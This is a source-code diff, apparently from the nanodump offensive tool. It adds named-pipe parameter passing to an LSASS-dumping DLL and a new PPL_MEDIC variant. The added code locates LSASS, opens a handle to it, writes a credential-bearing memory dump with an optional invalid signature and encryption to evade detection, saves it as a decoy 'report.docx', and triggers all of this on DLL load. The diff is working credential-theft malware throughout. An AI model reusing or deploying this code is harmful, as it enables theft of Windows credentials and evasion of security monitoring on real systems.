@@ -910,19 +910,63 @@ cleanup:
 #elif defined(NANO) && defined(SSP)
 
 #include "ssp.h"
+#include "pipe.h"
 
 BOOL NanoDumpSSP(void)
 {
-    /******************* change this *******************/
-    LPCSTR dump_path     = "C:\\Windows\\Temp\\report.docx";
-    BOOL   use_valid_sig = FALSE;
-    /***************************************************/
+#if !defined(PASS_PARAMS_VIA_NAMED_PIPES) || (PASS_PARAMS_VIA_NAMED_PIPES == 0)
 
-    dump_context   dc;
-    BOOL           success;
-    WCHAR          wcFilePath[MAX_PATH];
-    UNICODE_STRING full_dump_path;
-    BOOL           bReturnValue = FALSE;
+    /*
+     * if you compile with -DPASS_PARAMS_VIA_NAMED_PIPES=0, then these are the parameters
+     * that the nanodump DLL will use, change them to your liking
+     */
+    /******************* change this *******************/
+    LPCSTR         dump_path            = "C:\\Windows\\Temp\\report.docx";
+    BOOL           use_valid_sig        = FALSE;
+    /***************************************************/
+    dump_context   dc                   = { 0 };
+    BOOL           ret_val              = FALSE;
+    BOOL           success              = FALSE;
+    HANDLE         hProcess             = NULL;
+    SIZE_T         region_size          = 0;
+    PVOID          base_address         = NULL;
+    WCHAR          wcFilePath[MAX_PATH] = { 0 };
+    UNICODE_STRING full_dump_path       = { 0 };
+
+#else
+    HANDLE         hPipe                = NULL;
+    LPSTR          dump_path            = NULL;
+    BOOL           use_valid_sig        = FALSE;
+    dump_context   dc                   = { 0 };
+    BOOL           ret_val              = FALSE;
+    BOOL           success              = FALSE;
+    HANDLE         hProcess             = NULL;
+    SIZE_T         region_size          = 0;
+    PVOID          base_address         = NULL;
+    WCHAR          wcFilePath[MAX_PATH] = { 0 };
+    UNICODE_STRING full_dump_path       = { 0 };
+
+    success = server_create_named_pipe(
+        IPC_PIPE_NAME,
+        FALSE,
+        &hPipe);
+    if (!success)
+        goto cleanup;
+
+    success = server_listen_on_named_pipe(
+        hPipe);
+    if (!success)
+        goto cleanup;
+
+    success = server_recv_arguments_from_pipe(
+        hPipe,
+        &dump_path,
+        &use_valid_sig,
+        NULL);
+    if (!success)
+        goto cleanup;
+
+#endif
 
     full_dump_path.Buffer        = wcFilePath;
     full_dump_path.Length        = 0;
@@ -952,11 +996,11 @@ BOOL NanoDumpSSP(void)
     }
 
     // we are LSASS after all :)
-    HANDLE hProcess = NtCurrentProcess();
+    hProcess = NtCurrentProcess();
 
     // allocate a chuck of memory to write the dump
-    SIZE_T region_size = DUMP_MAX_SIZE;
-    PVOID base_address = allocate_memory(&region_size);
+    region_size = DUMP_MAX_SIZE;
+    base_address = allocate_memory(&region_size);
     if (!base_address)
         goto cleanup;
 
@@ -985,15 +1029,26 @@ BOOL NanoDumpSSP(void)
     if (!success)
         goto cleanup;
 
-    bReturnValue = TRUE;
+    ret_val = TRUE;
 
 cleanup:
     if (dc.BaseAddress && dc.DumpMaxSize)
         erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
-    if (!bReturnValue)
+    if (!ret_val)
         delete_file(dump_path);
+#if defined(PASS_PARAMS_VIA_NAMED_PIPES) && (PASS_PARAMS_VIA_NAMED_PIPES == 1)
+    if (dump_path)
+        intFree(dump_path);
+    server_send_success(
+        hPipe,
+        ret_val);
+    if (hPipe)
+        server_disconnect_pipe(hPipe);
+    if (hPipe)
+        NtClose(hPipe);
+#endif
 
-    return bReturnValue;
+    return ret_val;
 }
 
 __declspec(dllexport) BOOL APIENTRY DllMain(
@@ -1018,11 +1073,11 @@ __declspec(dllexport) BOOL APIENTRY DllMain(
     return FALSE;
 }
 
-#elif defined(NANO) && defined(PPL)
+#elif defined(NANO) && defined(PPL_DUMP)
 
 #include "ppl/cleanup.h"
 
-BOOL NanoDumpPPL(VOID)
+BOOL NanoDumpPPLDump(VOID)
 {
     dump_context   dc                   = { 0 };
     BOOL           bReturnValue         = FALSE;
@@ -1255,7 +1310,7 @@ __declspec(dllexport) BOOL APIENTRY DllMain(
     switch (fdwReason)
     {
         case DLL_PROCESS_ATTACH:
-            NanoDumpPPL();
+            NanoDumpPPLDump();
             break;
         case DLL_THREAD_ATTACH:
             break;
@@ -1294,5 +1349,238 @@ void APIENTRY EAQueryAggregateEventData(VOID) {}
 void APIENTRY EaFreeAggregatedEventParameters(VOID) {}
 void APIENTRY EaDeleteAggregatedEvent(VOID) {}
 void APIENTRY EADeleteAggregateEvent(VOID) {}
+
+#elif defined(NANO) && defined(PPL_MEDIC)
+
+#include "ppl/ppl_medic.h"
+#include "ppl/ppl_medic_dll.h"
+#include "pipe.h"
+
+BOOL NanoDumpPPLMedic(VOID)
+{
+#if !defined(PASS_PARAMS_VIA_NAMED_PIPES) || (PASS_PARAMS_VIA_NAMED_PIPES == 0)
+
+    /*
+     * if you compile with -DPASS_PARAMS_VIA_NAMED_PIPES=0, then these are the parameters
+     * that the nanodump DLL will use, change them to your liking
+     */
+    /******************* change this *******************/
+    LPSTR          dump_path            = "C:\\Windows\\Temp\\report.docx";
+    BOOL           use_valid_sig        = FALSE;
+    BOOL           elevate_handle       = FALSE;
+    /***************************************************/
+    dump_context   dc                   = { 0 };
+    BOOL           ret_val              = FALSE;
+    BOOL           success              = FALSE;
+    DWORD          lsass_pid            = 0;
+    HANDLE         hProcess             = NULL;
+    SIZE_T         region_size          = 0;
+    PVOID          base_address         = NULL;
+    WCHAR          wcFilePath[MAX_PATH] = { 0 };
+    UNICODE_STRING full_dump_path       = { 0 };
+
+    signal_dll_load_event(STR_IPC_WAASMEDIC_LOAD_EVENT_NAME);
+
+#else
+    HANDLE         hPipe                = NULL;
+    LPSTR          dump_path            = NULL;
+    BOOL           use_valid_sig        = FALSE;
+    BOOL           elevate_handle       = FALSE;
+    dump_context   dc                   = { 0 };
+    BOOL           ret_val              = FALSE;
+    BOOL           success              = FALSE;
+    DWORD          lsass_pid            = 0;
+    HANDLE         hProcess             = NULL;
+    SIZE_T         region_size          = 0;
+    PVOID          base_address         = NULL;
+    WCHAR          wcFilePath[MAX_PATH] = { 0 };
+    UNICODE_STRING full_dump_path       = { 0 };
+
+    success = server_create_named_pipe(
+        IPC_PIPE_NAME,
+        FALSE,
+        &hPipe);
+    if (!success)
+        goto cleanup;
+
+    success = signal_dll_load_event(STR_IPC_WAASMEDIC_LOAD_EVENT_NAME);
+    if (!success)
+        goto cleanup;
+
+    success = server_listen_on_named_pipe(
+        hPipe);
+    if (!success)
+        goto cleanup;
+
+    success = server_recv_arguments_from_pipe(
+        hPipe,
+        &dump_path,
+        &use_valid_sig,
+        &elevate_handle);
+    if (!success)
+        goto cleanup;
+
+#endif
+
+    full_dump_path.Buffer        = wcFilePath;
+    full_dump_path.Length        = 0;
+    full_dump_path.MaximumLength = 0;
+    get_full_path(&full_dump_path, dump_path);
+
+    dc.BaseAddress = NULL;
+    dc.DumpMaxSize = 0;
+
+#ifdef _M_IX86
+    if(local_is_wow64())
+    {
+        PRINT_ERR("Nanodump does not support WoW64");
+        return FALSE;
+    }
+#endif
+
+    //remove_syscall_callback_hook();
+
+    if (!full_dump_path.Length)
+        goto cleanup;
+
+    // not sure why this fails
+    //success = enable_debug_priv();
+    //if (!success)
+    //    goto cleanup;
+    
+    // if not provided, get the PID of LSASS
+    if (!lsass_pid)
+    {
+        lsass_pid = get_lsass_pid();
+        if (!lsass_pid)
+            goto cleanup;
+    }
+    else
+    {
+        DPRINT("Using %ld as the PID of " LSASS, lsass_pid);
+    }
+
+    if (!create_file(&full_dump_path))
+        goto cleanup;
+
+    success = obtain_lsass_handle(
+        &hProcess,
+        lsass_pid,
+        FALSE,
+        elevate_handle,
+        FALSE,
+        FALSE,
+        0,
+        FALSE,
+        NULL,
+        NULL,
+        use_valid_sig,
+        dump_path,
+        FALSE,
+        FALSE,
+        NULL,
+        FALSE,
+        FALSE,
+        FALSE);
+    if (!success)
+        goto cleanup;
+
+    // set the signature
+    if (use_valid_sig)
+    {
+        DPRINT("Using a valid signature");
+        dc.Signature = MINIDUMP_SIGNATURE;
+        dc.Version = MINIDUMP_VERSION;
+        dc.ImplementationVersion = MINIDUMP_IMPL_VERSION;
+    }
+    else
+    {
+        DPRINT("Using a invalid signature");
+        generate_invalid_sig(
+            &dc.Signature,
+            &dc.Version,
+            &dc.ImplementationVersion);
+    }
+
+    // allocate a chuck of memory to write the dump
+    region_size = DUMP_MAX_SIZE;
+    base_address = allocate_memory(&region_size);
+    if (!base_address)
+        goto cleanup;
+
+    dc.hProcess    = hProcess;
+    dc.BaseAddress = base_address;
+    dc.rva         = 0;
+    dc.DumpMaxSize = region_size;
+
+    success = NanoDumpWriteDump(&dc);
+    if (!success)
+        goto cleanup;
+
+    DPRINT(
+        "The dump was created successfully, final size: %d MiB",
+        (dc.rva/1024)/1024);
+
+    if (!use_valid_sig)
+    {
+        // at this point, you can encrypt or obfuscate the dump
+        encrypt_dump(
+            dc.BaseAddress,
+            dc.rva);
+    }
+
+    success = write_file(
+        &full_dump_path,
+        dc.BaseAddress,
+        dc.rva);
+
+    if (!success)
+        goto cleanup;
+
+    ret_val = TRUE;
+
+cleanup:
+    if (dc.BaseAddress && dc.DumpMaxSize)
+        erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
+    if (hProcess)
+        NtClose(hProcess);
+    if (!ret_val)
+        delete_file(dump_path);
+#if defined(PASS_PARAMS_VIA_NAMED_PIPES) && (PASS_PARAMS_VIA_NAMED_PIPES == 1)
+    if (dump_path)
+        intFree(dump_path);
+    server_send_success(
+        hPipe,
+        ret_val);
+    if (hPipe)
+        server_disconnect_pipe(hPipe);
+    if (hPipe)
+        NtClose(hPipe);
+#endif
+
+    return ret_val;
+}
+
+__declspec(dllexport) BOOL APIENTRY DllMain(
+    HINSTANCE hinstDLL,
+    DWORD fdwReason,
+    LPVOID lpReserved)
+{
+    UNUSED(hinstDLL);
+    UNUSED(lpReserved);
+    switch (fdwReason)
+    {
+        case DLL_PROCESS_ATTACH:
+            NanoDumpPPLMedic();
+            break;
+        case DLL_THREAD_ATTACH:
+            break;
+        case DLL_THREAD_DETACH:
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
 
 #endif
